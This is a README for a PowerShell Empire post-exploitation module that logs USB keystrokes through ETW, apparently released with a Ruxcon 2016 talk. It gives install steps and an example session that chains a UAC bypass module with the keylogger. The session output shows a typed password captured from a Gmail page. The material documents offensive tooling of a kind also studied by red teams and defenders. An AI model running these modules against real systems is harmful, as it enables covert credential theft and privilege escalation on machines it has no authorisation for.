# PSE_ETWKeylogger
PowerShell Empire module for our keylogging technique presented at Ruxcon 2016

Slides:  
https://ruxcon.org.au/slides/

C# POC Code:  
https://github.com/CyberPoint/Ruxcon2016ETW/tree/master/KeyloggerPOC


##Install
Copy files to PSE:  
Get-USBKeystrokes.ps1 -> <Empire_dir>/data/module_source/collection/  
USBKeyLogger.py -> <Emipre_dir>/lib/modules/collection/  

##Requirements
Windows 7* and up  
*Windows 7 - No USB 3.0 support  
USB Keyboard  
Admin priveleges  

##Usage
Requires admin to run (see UAC bypasses: privesc/bypassuac*). From a PSE agent session:  

usemodule collection/USBKeylogger  
execute  

##Example Session
(include UAC bypass)  

(Empire: privesc/bypassuac) > [+] Initial agent PTELZMW2KL4NKZMD from 10.10.10.181 now active  
interact  PTELZMW2KL4NKZMD  
(Empire: PTELZMW2KL4NKZMD) > usemodule privesc/bypassuac_eventvwr  
(Empire: privesc/bypassuac_eventvwr) > set Listener 1  
(Empire: privesc/bypassuac_eventvwr) > execute  
(Empire: privesc/bypassuac_eventvwr) >  
Job started: Debug32_gz2k1  
[+] Initial agent BQSZGT2BZH3A4CUT from 10.10.10.181 now active  
interact BQSZGT2BZH3A4CUT  
(Empire: BQSZGT2BZH3A4CUT) > usemodule collection/USBKeylogger  
(Empire: collection/USBKeylogger) > execute  
(Empire: collection/USBKeylogger) >  
Job started: Debug32_24nbw

ETWKeylogger, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null  
ETW library loaded  
Callback registered. Starting keylogger  
Started keylogger  

[=== Gmail and 1 more page ‎- Microsoft Edge - 09/11/2016:13:02:20 ===]  
password  

